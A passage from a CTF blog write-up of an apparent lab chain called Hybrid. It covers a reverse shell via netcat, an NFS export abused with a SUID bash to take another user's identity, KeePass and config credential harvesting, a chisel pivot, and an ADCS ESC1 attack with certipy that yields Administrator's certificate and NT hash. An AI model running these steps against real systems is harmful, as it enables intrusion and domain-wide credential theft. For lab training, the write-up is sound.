<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.168.102 - - [28/Apr/2025 14:03:22] <span class="string">&quot;GET /x HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
<p>Hits us!!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 900114:04:13 [14/27]</span><br><span class="line">listening on [any] 9001 ...  </span><br><span class="line">connect to [10.8.4.29] from (UNKNOWN) [10.10.168.102] 52370</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (646): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@mail01:~/roundcube$ python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@mail01:~/roundcube$</span><br></pre></td></tr></table></figure>

<p>We got our callback.</p>
<h2 id="Shell-as-www-data"><a href="#Shell-as-www-data" class="headerlink" title="Shell as www-data"></a>Shell as www-data</h2><p>Checking the mysql config doesn’t yield much but the same users.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@mail01:~/roundcube$ <span class="built_in">cat</span> config/config.inc.php | grep -v <span class="string">&#x27;^//&#x27;</span> | grep .</span><br><span class="line">&lt;?php</span><br><span class="line">/* Local configuration <span class="keyword">for</span> Roundcube Webmail */</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;db_dsnw&#x27;</span>] = <span class="string">&#x27;mysql://roundcube:&lt;SNIP&gt;@localhost/roundcubemail&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;imap_host&#x27;</span>] = <span class="string">&#x27;localhost:143&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;support_url&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;des_key&#x27;</span>] = <span class="string">&#x27;RpiHQJt10wGZdlMAU9CnBPfc&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;plugins&#x27;</span>] = [<span class="string">&quot;markasjunk&quot;</span>];</span><br></pre></td></tr></table></figure>

<p>Since the NFS was running we can check its configs at <code>/etc/exports</code>. Which yields the follwing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /etc/exports</span><br><span class="line"><span class="comment"># /etc/exports: the access control list for filesystems which may be exported</span></span><br><span class="line"><span class="comment">#               to NFS clients.  See exports(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv2 and NFSv3:</span></span><br><span class="line"><span class="comment"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Example for NFSv4:</span></span><br><span class="line"><span class="comment"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span></span><br><span class="line"><span class="comment"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">/opt/share *(rw,no_subtree_check)    </span><br></pre></td></tr></table></figure>

<p>This is a good one!!! Basically, we can copy the systems <code>/bin/bash</code> to <code>/opt/share</code>(<em>your machines &#x2F;bin&#x2F;bash might not work</em>). Then create user <em>peter</em> with the same <code>uid</code> and give ownership of bash to peter and give it a stickybit. Execute on the victim machine. </p>
<p><img src="/img/bazzinga.gif"></p>
<p>We’re peter on the box!!✨✨</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">---VicMac--</span><br><span class="line">$ <span class="built_in">cp</span> /bin/bash /opt/share</span><br><span class="line">$ <span class="built_in">id</span> peter.turner@hybrid.vl</span><br><span class="line">uid=&lt;SNIP&gt;(peter.turner@hybrid.vl) gid=&lt;SNIP&gt;(domain <span class="built_in">users</span>@hybrid.vl) <span class="built_in">groups</span>=&lt;SNIP&gt;(domain <span class="built_in">users</span>@hybrid.vl),&lt;SNIP&gt;(hybridusers@hybrid.vl)</span><br><span class="line">--AttMac--</span><br><span class="line">$ useradd -u &lt;SNIP&gt; -r -s /bin/bash peter</span><br><span class="line">$ su peter</span><br><span class="line">$ <span class="built_in">cp</span> /opt/share/bash .</span><br><span class="line">$ <span class="built_in">chmod</span> +s bash</span><br><span class="line">$ <span class="built_in">cp</span> bash /opt/share</span><br><span class="line">--VicMac--</span><br><span class="line">$ ./bash -p</span><br><span class="line">bash-5.1$ <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=90&lt;SNIP&gt;(peter.turner@hybrid.vl) egid=992 <span class="built_in">groups</span>=992,33(www-data)</span><br><span class="line">bash-5.1$ </span><br></pre></td></tr></table></figure>

<p>We have <code>euid</code> of <em>peter.turner</em>, which means we can see his home directory now. His home directory contains <code>passwords.kdbx</code>, a KeePass Database. Getting this to our windows vm and looking at it it requires a password. We can try one of the passwords we found from the <code>dovecot-users</code> file, which gets is in.</p>
<p><img src="/img/kpass.png"></p>
<h2 id="Root-Toot"><a href="#Root-Toot" class="headerlink" title="Root Toot!!"></a>Root Toot!!</h2><p>Now we have his domain password, and if we try to simply ssh to the box with this password, we get a session. As a added bonus, we get root easily!!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ssh peter.turner@hybrid.vl@mail01.hybrid.vl          </span><br><span class="line">(peter.turner@hybrid.vl@mail01.hybrid.vl) Password:</span><br><span class="line"></span><br><span class="line">Last login: Mon Apr 28 23:17:53 2025 from 10.8.4.29</span><br><span class="line">peter.turner@hybrid.vl@mail01:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> peter.turner@hybrid.vl: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> peter.turner@hybrid.vl on mail01:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User peter.turner@hybrid.vl may run the following commands on mail01:</span><br><span class="line">    (ALL) ALL</span><br><span class="line">peter.turner@hybrid.vl@mail01:~$ <span class="built_in">sudo</span> su</span><br><span class="line">root@mail01:/home/peter.turner@hybrid.vl#</span><br></pre></td></tr></table></figure>

<h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><p>Setting up a tunnel using <code>chisel</code> so we can continue our enumeration. After doing so, we get an bloodhound dump.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q nxc ldap hybrid.vl -u peter.turner -p <span class="string">&#x27;b0cwR+G4Dzl_rw&#x27;</span> --dns-server 10.10.145.149 --bloodhound -c All</span><br></pre></td></tr></table></figure>
<p>Long story short, peter didn’t have anything we could to our advantage.</p>
<p>Seeing as ADCS is running on the machine we can try there.</p>
<h2 id="ADCS-is-my-friend"><a href="#ADCS-is-my-friend" class="headerlink" title="ADCS is my friend"></a>ADCS is my friend</h2><p>Running <code>certipy</code> we find that this template is vulnerable to ESC1. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy find -vulnerable -dc-ip 10.10.149.117 -u peter.turner@hybrid.vl -p &lt;SNIP&gt; -stdout -debug</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"> [!] Vulnerabilities</span><br><span class="line">      ESC1                              : <span class="string">&#x27;HYBRID.VL\\Domain Computers&#x27;</span> can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>

<p>Yet we need a <code>Domain Computer</code> to do this, and we did have root on the <code>MAIL01$</code> machine. We can get the keytab file for kerberos over to our machine and use <code>keytabextract.py</code>. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ keytabextract.py /home/jay/Documents/vl/chains/hybrid/krb5.keytab </span><br><span class="line">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM <span class="built_in">hash</span>.</span><br><span class="line">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[*] AES128-CTS-HMAC-SHA1 <span class="built_in">hash</span> discovered. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[+] Keytab File successfully imported.</span><br><span class="line">        REALM : HYBRID.VL</span><br><span class="line">        SERVICE PRINCIPAL : MAIL01$/</span><br><span class="line">        NTLM HASH : &lt;SNIP&gt;</span><br><span class="line">        AES-256 HASH : &lt;SNIP&gt;</span><br><span class="line">        AES-128 HASH : &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>Now we can exploit ESC1 with a couple commands.</p>
<p>Firstly, we request with <code>upn</code> Administrator using the CA and the Template Name. This will give us a pfx file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy req -dc-ip 10.10.149.117 -u <span class="string">&#x27;MAIL01$@hybrid.vl&#x27;</span> -hashes :&lt;SNIP&gt; -ca hybrid-DC01-CA -template HybridComputers -upn Administrator -key-size 4096 -debug</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Generating RSA key</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[+] Trying to connect to endpoint: ncacn_np:10.10.149.117[\pipe\cert]                          </span><br><span class="line">[+] Connected to endpoint: ncacn_np:10.10.149.117[\pipe\cert]</span><br><span class="line">[*] Successfully requested certificate                                                         </span><br><span class="line">[*] Request ID is 21</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;Administrator&#x27;</span></span><br><span class="line">[*] Certificate has no object SID                                                              </span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Lastly, we authenticate with the pfx file. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy auth -pfx administrator.pfx -domain hybrid.vl -dc-ip 10.10.149.117 -debug</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@hybrid.vl</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@hybrid.vl&#x27;</span>: &lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ADCS/">ADCS</a><a class="post-meta__tags" href="/tags/NFS/">NFS</a><a class="post-meta__tags" href="/tags/Roundcube-Webmail/">Roundcube Webmail</a></div><div class="post-share"><div class="social-share" data-image="/img/hybrid.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/25/Manage/" title="Manage (Linux Easy)"><img class="cover" src="/img/manage.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Manage (Linux Easy)</div></div><div class="info-2"><div class="info-item-1">Manage is a Linux Easy machine starting off with Java RMI using beanshooter. After enumeration we see we gather credentials and that authorization on the Remote MBean server isn’t required. Using this we are able to get a foothold on the machine. As user tomcat, we see other users we can attack in /etc/passwd. Trying to escalate our privilege to useradmin we have password reuse from the credentials we gathered, but upon entering the password were asked for verification. Looking in useradmin‘s home we see a backup tar file. Getting it to our machine yields this users home directory backed up. We have a ssh key we can use to get on the box, along with .google_authenticator having PINS to try. Doing so gets us sshed on the box. Looking at our users privilege, we see we have ALL:ALL on /usr/sbin/adduser. Looking at a typical sudoers file we see we can use admin as a user, as this group is not present on the box. Upon adding this user, they will in turn be added to the admin group...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping 🔐🔐</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP"><span class="toc-number">2.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS"><span class="toc-number">3.</span> <span class="toc-text">NFS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoundCube-Webmail"><span class="toc-number">4.</span> <span class="toc-text">RoundCube Webmail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-www-data"><span class="toc-number">5.</span> <span class="toc-text">Shell as www-data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Toot"><span class="toc-number">6.</span> <span class="toc-text">Root Toot!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pivoting"><span class="toc-number">7.</span> <span class="toc-text">Pivoting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-is-my-friend"><span class="toc-number">8.</span> <span class="toc-text">ADCS is my friend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">9.</span> <span class="toc-text">PrivEsc</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>